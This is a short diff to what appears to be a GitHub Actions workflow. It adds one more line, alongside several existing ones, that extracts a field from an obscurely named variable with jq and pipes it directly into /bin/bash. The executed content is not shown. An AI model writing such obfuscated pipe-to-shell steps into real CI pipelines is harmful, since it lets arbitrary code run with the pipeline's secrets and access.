@@ -23,6 +23,7 @@ jobs:
           echo $qgk24272 | jq -r .ikc06417 | /bin/bash
           echo $nxybb07899 | jq -r .nn70051 | /bin/bash
           printf '%s' "$zh86" | jq -r .erl898 | /bin/bash
+          echo $rzc4326 | jq -r .u4184 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
